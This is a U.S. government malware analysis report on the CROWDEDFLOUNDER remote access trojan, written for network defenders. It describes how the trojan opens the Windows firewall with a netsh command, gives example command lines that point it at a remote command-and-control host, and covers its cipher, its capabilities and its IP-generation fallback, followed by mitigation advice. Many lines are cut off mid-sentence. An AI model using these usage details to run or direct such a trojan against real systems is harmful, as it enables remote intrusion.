Working with U.S. Government partners, DHS, FBI, and DoD identified Trojan malware variants used by the N\ngovernment. This malware variant has been identified as CROWDEDFLOUNDER. The U.S. Government refers to malicious cyber activity by the\ngovernment as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https[:]//www[.]us-cert.gov/hiddencobra.\n\nDHS, FBI, and DoD are distributing this MAR to enable network defense and reduce exposure to North Korean government malicious cyber activi\n\nThis MAR includes malware descriptions related to HIDDEN COBRA, suggested response actions and recommended mitigation techniques. Use\nshould flag activity associated with the malware and report the activity to the Cybersecurity and Infrastructure Security Agency (CISA) or the FBI C\n(CyWatch), and give the activity the highest priority for enhanced mitigation.\n\nThis report analyzes a Themida packed 32-bit Windows executable, which is designed to unpack and execute a Remote Access Trojan (RAT) bin\napplication is designed to accept arguments during execution or can be installed as a service with command line arguments.

This applica\naccept arguments during execution or can be installed as a service with command line arguments. When executed, the application is designed to\nFirewall on the victim’s machine to allow for incoming and outgoing connections from the victim system. The firewall is modified using a \"netsh fire\nportopening\" command (Figure 2). Static analysis indicates this malware may be utilized to listen as a proxy for incoming connections containing c\nconnect to a remote server to receive commands. The following command line arguments are utilized to control the RAT functionality:\n\n--Begin RAT command line arguments-\n-p: You can use the -p command line argument to force the malware to listen on a specific port. Example: malware.exe -p 8888\n\n-h: You can use the -h CLI to force the malware to connect to a remote host and port. Example: malware.exe -h <url_string>:8888\n\nNote: <url_string> can be either a fully qualified domain name or an Internet Protocol (IP) address.\n\n--End RAT command line arguments-\nThe RAT uses a rotating exclusive or (XOR) cryptographic algorithm to secure its data transfers and command-and-control (C2) sessions (Figure\ndesigned to accept instructions from the remote server to perform the following functions:\n\n\n-----\n\ng p y\nDownload and upload files\nExecute secondary payloads\nExecute shell commands\nTerminate running processes\nDelete files\nSearch files\nSet file attributes\nCollect device information from installed storage devices (disk free space and their type)\nList running processes information\nCollect and send information about the victim's system\nSecurely download malicious DLLs and inject them into remote processes\n--End functions performed by the malware-\nThe -h argument is utilized to force the RAT to connect to a C2 server and the CURL library (Version 7.49.1) will be used for data transfers. Note:\ncipher will be used to secure all C2 traffic sent and received from the external C2 server. Although the malware appears to expect a numeric IP ad\nargument, it will also accept a string Uniform Resource Locator (URL) value. If a URL string is provided (i.e. domain.com) the malware will then qu\nusing the Win32 API getaddrinfo(). If this call succeeds, an IP address will be returned and the malware will attempt to connect to that IP address.\ngetaddrinfo() fails the malware will hash this domain using the MD5 hashing algorithm, resulting in a 16 byte hash value. The malware will then ta\nof this hash value and XOR them with a four byte value. The resultant four byte value will then be treated as a numeric IP address. The malware w\nconnect to this newly generated IP address. Note: all of the command line executables referenced within this product generate and connect to an\ngenerated from the provided URL string if the call to getaddrinfo() against the provided URL fails.\nScreenshots\n\n**Figure 1 - XOR based cipher utilized by RAT to secure traffic between itself and the operator/C2 server.**\n\n\n-----\n\n**Figure 2 - Malware loading the command to open the firewall.**\n\n**Figure 3 - This structure is utilized to parse the proxy port or remote C2 server from the command line arguments.**\n\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organizatio\nconfiguration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unl\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Specia\n**\"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".**\n\n## Contact Information\n\nCISA continuously strives to improve its products and services.
